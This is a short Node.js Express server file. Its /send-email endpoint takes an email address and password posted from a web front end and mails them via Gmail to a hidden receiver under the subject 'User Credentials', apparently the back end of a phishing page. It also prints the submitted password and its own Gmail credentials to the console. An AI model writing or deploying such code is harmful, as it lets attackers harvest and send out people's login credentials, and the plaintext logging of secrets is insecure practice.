import dotenv from "dotenv";
import express from "express";
import nodemailer from "nodemailer";
import bodyParser from "body-parser";
import cors from "cors";

dotenv.config(); // Load environment variables from .env file

const app = express();
app.use(cors({
  origin: "http://localhost:5173",  
  methods: "GET,POST,OPTIONS",
  allowedHeaders: "Content-Type,Authorization"
}));

app.use(bodyParser.json());

// Log environment variables for debugging
console.log("Email User:", process.env.EMAIL_USER);
console.log("Email Pass:", process.env.EMAIL_PASS);
console.log("Email Receiver:", process.env.EMAIL_RECEIVER);

// Configure Nodemailer transporter
const transporter = nodemailer.createTransport({
  service: "gmail",
  auth: {
    user: process.env.EMAIL_USER, // Use environment variable
    pass: process.env.EMAIL_PASS, // Use environment variable
  },
});


// Verify Nodemailer configuration
transporter.verify((error, success) => {
  if (error) {
    console.error("Nodemailer verification error:", error);
  } else {
    console.log("Nodemailer is ready to send emails");
  }
});

app.post("/send-email", async (req, res) => {
  const { email, password } = req.body;
  console.log("Request body:", { email, password });

  let mailOptions = {
    from: email,
    to: process.env.EMAIL_RECEIVER, // Use environment variable
    subject: "User Credentials",
    text: `Email: ${email}\nPassword: ${password}`,
  };

  try {
    let info = await transporter.sendMail(mailOptions);
    console.log("Email sent: " + info.response);
    res.status(200).json({ success: true });
  } catch (error) {
    console.error("Nodemailer error:", error);
    res.status(500).json({ success: false, error: error.message });
  }
});

app.listen(8080, () => {
  console.log("Server is running on port 8080");
});